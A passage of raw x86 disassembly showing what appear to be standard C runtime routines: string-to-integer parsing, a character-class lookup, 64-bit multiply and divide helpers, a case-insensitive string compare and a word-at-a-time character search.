  428891:	jmp    0x42886b
  428893:	movzx  ecx,BYTE PTR [esi]
  428896:	inc    esi
  428897:	cmp    ecx,0x2d
  42889a:	mov    edx,ecx
  42889c:	je     0x4288a3
  42889e:	cmp    ecx,0x2b
  4288a1:	jne    0x4288a7
  4288a3:	movzx  ecx,BYTE PTR [esi]
  4288a6:	inc    esi
  4288a7:	xor    eax,eax
  4288a9:	cmp    ecx,0x30
  4288ac:	jl     0x4288b8
  4288ae:	cmp    ecx,0x39
  4288b1:	jg     0x4288b8
  4288b3:	sub    ecx,0x30
  4288b6:	jmp    0x4288bb
  4288b8:	or     ecx,0xffffffff
  4288bb:	cmp    ecx,0xffffffff
  4288be:	je     0x4288cc
  4288c0:	lea    eax,[eax+eax*4]
  4288c3:	lea    eax,[ecx+eax*2]
  4288c6:	movzx  ecx,BYTE PTR [esi]
  4288c9:	inc    esi
  4288ca:	jmp    0x4288a9
  4288cc:	cmp    edx,0x2d
  4288cf:	pop    edi
  4288d0:	pop    esi
  4288d1:	jne    0x4288d5
  4288d3:	neg    eax
  4288d5:	ret    
  4288d6:	push   ebp
  4288d7:	mov    ebp,esp
  4288d9:	push   ecx
  4288da:	mov    eax,DWORD PTR [ebp+0xc]
  4288dd:	lea    ecx,[eax+0x1]
  4288e0:	cmp    ecx,0x100
  4288e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4288e9:	ja     0x4288f4
  4288eb:	mov    ecx,DWORD PTR [ecx+0x48]
  4288ee:	movzx  eax,WORD PTR [ecx+eax*2]
  4288f2:	jmp    0x428948
  4288f4:	push   esi
  4288f5:	mov    edx,eax
  4288f7:	sar    edx,0x8
  4288fa:	push   edi
  4288fb:	mov    edi,DWORD PTR [ecx+0x48]
  4288fe:	movzx  esi,dl
  428901:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428906:	pop    edi
  428907:	pop    esi
  428908:	je     0x428919
  42890a:	and    BYTE PTR [ebp-0x2],0x0
  42890e:	push   0x2
  428910:	mov    BYTE PTR [ebp-0x3],al
  428913:	mov    BYTE PTR [ebp-0x4],dl
  428916:	pop    eax
  428917:	jmp    0x428923
  428919:	and    BYTE PTR [ebp-0x3],0x0
  42891d:	mov    BYTE PTR [ebp-0x4],al
  428920:	xor    eax,eax
  428922:	inc    eax
  428923:	push   0x1
  428925:	push   DWORD PTR [ecx+0x14]
  428928:	push   DWORD PTR [ecx+0x4]
  42892b:	lea    ecx,[ebp+0xe]
  42892e:	push   ecx
  42892f:	push   eax
  428930:	lea    eax,[ebp-0x4]
  428933:	push   eax
  428934:	push   0x1
  428936:	call   0x4279b8
  42893b:	add    esp,0x1c
  42893e:	test   eax,eax
  428940:	jne    0x428944
  428942:	leave  
  428943:	ret    
  428944:	movzx  eax,WORD PTR [ebp+0xe]
  428948:	and    eax,DWORD PTR [ebp+0x10]
  42894b:	leave  
  42894c:	ret    
  42894d:	int3   
  42894e:	int3   
  42894f:	int3   
  428950:	mov    eax,DWORD PTR [esp+0x8]
  428954:	mov    ecx,DWORD PTR [esp+0x10]
  428958:	or     ecx,eax
  42895a:	mov    ecx,DWORD PTR [esp+0xc]
  42895e:	jne    0x428969
  428960:	mov    eax,DWORD PTR [esp+0x4]
  428964:	mul    ecx
  428966:	ret    0x10
  428969:	push   ebx
  42896a:	mul    ecx
  42896c:	mov    ebx,eax
  42896e:	mov    eax,DWORD PTR [esp+0x8]
  428972:	mul    DWORD PTR [esp+0x14]
  428976:	add    ebx,eax
  428978:	mov    eax,DWORD PTR [esp+0x8]
  42897c:	mul    ecx
  42897e:	add    edx,ebx
  428980:	pop    ebx
  428981:	ret    0x10
  428984:	int3   
  428985:	int3   
  428986:	int3   
  428987:	int3   
  428988:	int3   
  428989:	int3   
  42898a:	int3   
  42898b:	int3   
  42898c:	int3   
  42898d:	int3   
  42898e:	int3   
  42898f:	int3   
  428990:	push   ebp
  428991:	mov    ebp,esp
  428993:	push   edi
  428994:	push   esi
  428995:	push   ebx
  428996:	mov    ecx,DWORD PTR [ebp+0x10]
  428999:	or     ecx,ecx
  42899b:	je     0x4289ea
  42899d:	mov    esi,DWORD PTR [ebp+0x8]
  4289a0:	mov    edi,DWORD PTR [ebp+0xc]
  4289a3:	mov    bh,0x41
  4289a5:	mov    bl,0x5a
  4289a7:	mov    dh,0x20
  4289a9:	lea    ecx,[ecx+0x0]
  4289ac:	mov    ah,BYTE PTR [esi]
  4289ae:	or     ah,ah
  4289b0:	mov    al,BYTE PTR [edi]
  4289b2:	je     0x4289db
  4289b4:	or     al,al
  4289b6:	je     0x4289db
  4289b8:	add    esi,0x1
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,bh
  4289c0:	jb     0x4289c8
  4289c2:	cmp    ah,bl
  4289c4:	ja     0x4289c8
  4289c6:	add    ah,dh
  4289c8:	cmp    al,bh
  4289ca:	jb     0x4289d2
  4289cc:	cmp    al,bl
  4289ce:	ja     0x4289d2
  4289d0:	add    al,dh
  4289d2:	cmp    ah,al
  4289d4:	jne    0x4289e1
  4289d6:	sub    ecx,0x1
  4289d9:	jne    0x4289ac
  4289db:	xor    ecx,ecx
  4289dd:	cmp    ah,al
  4289df:	je     0x4289ea
  4289e1:	mov    ecx,0xffffffff
  4289e6:	jb     0x4289ea
  4289e8:	neg    ecx
  4289ea:	mov    eax,ecx
  4289ec:	pop    ebx
  4289ed:	pop    esi
  4289ee:	pop    edi
  4289ef:	leave  
  4289f0:	ret    
  4289f1:	int3   
  4289f2:	int3   
  4289f3:	int3   
  4289f4:	int3   
  4289f5:	int3   
  4289f6:	int3   
  4289f7:	int3   
  4289f8:	int3   
  4289f9:	int3   
  4289fa:	int3   
  4289fb:	int3   
  4289fc:	int3   
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	push   esi
  428a01:	mov    eax,DWORD PTR [esp+0x14]
  428a05:	or     eax,eax
  428a07:	jne    0x428a31
  428a09:	mov    ecx,DWORD PTR [esp+0x10]
  428a0d:	mov    eax,DWORD PTR [esp+0xc]
  428a11:	xor    edx,edx
  428a13:	div    ecx
  428a15:	mov    ebx,eax
  428a17:	mov    eax,DWORD PTR [esp+0x8]
  428a1b:	div    ecx
  428a1d:	mov    esi,eax
  428a1f:	mov    eax,ebx
  428a21:	mul    DWORD PTR [esp+0x10]
  428a25:	mov    ecx,eax
  428a27:	mov    eax,esi
  428a29:	mul    DWORD PTR [esp+0x10]
  428a2d:	add    edx,ecx
  428a2f:	jmp    0x428a78
  428a31:	mov    ecx,eax
  428a33:	mov    ebx,DWORD PTR [esp+0x10]
  428a37:	mov    edx,DWORD PTR [esp+0xc]
  428a3b:	mov    eax,DWORD PTR [esp+0x8]
  428a3f:	shr    ecx,1
  428a41:	rcr    ebx,1
  428a43:	shr    edx,1
  428a45:	rcr    eax,1
  428a47:	or     ecx,ecx
  428a49:	jne    0x428a3f
  428a4b:	div    ebx
  428a4d:	mov    esi,eax
  428a4f:	mul    DWORD PTR [esp+0x14]
  428a53:	mov    ecx,eax
  428a55:	mov    eax,DWORD PTR [esp+0x10]
  428a59:	mul    esi
  428a5b:	add    edx,ecx
  428a5d:	jb     0x428a6d
  428a5f:	cmp    edx,DWORD PTR [esp+0xc]
  428a63:	ja     0x428a6d
  428a65:	jb     0x428a76
  428a67:	cmp    eax,DWORD PTR [esp+0x8]
  428a6b:	jbe    0x428a76
  428a6d:	dec    esi
  428a6e:	sub    eax,DWORD PTR [esp+0x10]
  428a72:	sbb    edx,DWORD PTR [esp+0x14]
  428a76:	xor    ebx,ebx
  428a78:	sub    eax,DWORD PTR [esp+0x8]
  428a7c:	sbb    edx,DWORD PTR [esp+0xc]
  428a80:	neg    edx
  428a82:	neg    eax
  428a84:	sbb    edx,0x0
  428a87:	mov    ecx,edx
  428a89:	mov    edx,ebx
  428a8b:	mov    ebx,ecx
  428a8d:	mov    ecx,eax
  428a8f:	mov    eax,esi
  428a91:	pop    esi
  428a92:	ret    0x10
  428a95:	int3   
  428a96:	int3   
  428a97:	int3   
  428a98:	int3   
  428a99:	int3   
  428a9a:	int3   
  428a9b:	int3   
  428a9c:	int3   
  428a9d:	int3   
  428a9e:	int3   
  428a9f:	int3   
  428aa0:	lea    eax,[edx-0x1]
  428aa3:	pop    ebx
  428aa4:	ret    
  428aa5:	lea    esp,[esp+0x0]
  428aac:	lea    esp,[esp+0x0]
  428ab0:	xor    eax,eax
  428ab2:	mov    al,BYTE PTR [esp+0x8]
  428ab6:	push   ebx
  428ab7:	mov    ebx,eax
  428ab9:	shl    eax,0x8
  428abc:	mov    edx,DWORD PTR [esp+0x8]
  428ac0:	test   edx,0x3
  428ac6:	je     0x428add
  428ac8:	mov    cl,BYTE PTR [edx]
  428aca:	add    edx,0x1
  428acd:	cmp    cl,bl
  428acf:	je     0x428aa0
  428ad1:	test   cl,cl
  428ad3:	je     0x428b26
  428ad5:	test   edx,0x3
  428adb:	jne    0x428ac8
  428add:	or     ebx,eax
  428adf:	push   edi
  428ae0:	mov    eax,ebx
  428ae2:	shl    ebx,0x10
  428ae5:	push   esi
  428ae6:	or     ebx,eax
  428ae8:	mov    ecx,DWORD PTR [edx]
  428aea:	mov    edi,0x7efefeff
  428aef:	mov    eax,ecx
  428af1:	mov    esi,edi
  428af3:	xor    ecx,ebx
  428af5:	add    esi,eax
  428af7:	add    edi,ecx
  428af9:	xor    ecx,0xffffffff
  428afc:	xor    eax,0xffffffff
  428aff:	xor    ecx,edi
  428b01:	xor    eax,esi
  428b03:	add    edx,0x4
  428b06:	and    ecx,0x81010100
  428b0c:	jne    0x428b2a
  428b0e:	and    eax,0x81010100
  428b13:	je     0x428ae8
  428b15:	and    eax,0x1010100
  428b1a:	jne    0x428b24
  428b1c:	and    esi,0x80000000
  428b22:	jne    0x428ae8
  428b24:	pop    esi
  428b25:	pop    edi
  428b26:	pop    ebx
  428b27:	xor    eax,eax
  428b29:	ret    
  428b2a:	mov    eax,DWORD PTR [edx-0x4]
  428b2d:	cmp    al,bl
  428b2f:	je     0x428b67
  428b31:	test   al,al
  428b33:	je     0x428b24
  428b35:	cmp    ah,bl
  428b37:	je     0x428b60
  428b39:	test   ah,ah
  428b3b:	je     0x428b24
  428b3d:	shr    eax,0x10
  428b40:	cmp    al,bl
  428b42:	je     0x428b59
  428b44:	test   al,al
  428b46:	je     0x428b24
  428b48:	cmp    ah,bl
  428b4a:	je     0x428b52
  428b4c:	test   ah,ah
  428b4e:	je     0x428b24
  428b50:	jmp    0x428ae8
  428b52:	pop    esi
  428b53:	pop    edi
  428b54:	lea    eax,[edx-0x1]
  428b57:	pop    ebx
  428b58:	ret    
  428b59:	lea    eax,[edx-0x2]
  428b5c:	pop    esi
  428b5d:	pop    edi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	lea    eax,[edx-0x3]
  428b63:	pop    esi
  428b64:	pop    edi
  428b65:	pop    ebx
  428b66:	ret    
  428b67:	lea    eax,[edx-0x4]
  428b6a:	pop    esi
  428b6b:	pop    edi
  428b6c:	pop    ebx
  428b6d:	ret    
  428b6e:	jmp    DWORD PTR ds:0x42905c
